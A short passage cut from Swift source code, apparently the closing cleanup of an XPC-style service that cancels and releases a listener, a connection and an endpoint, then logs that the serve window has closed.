            if let l = self.listener { xq_cancel(l); xq_release(l); self.listener = nil }
            xq_cancel(conn)
            xq_release(conn)
            xq_release(ep)
            self.emit("xpc: serve window closed")
        }
    }
}

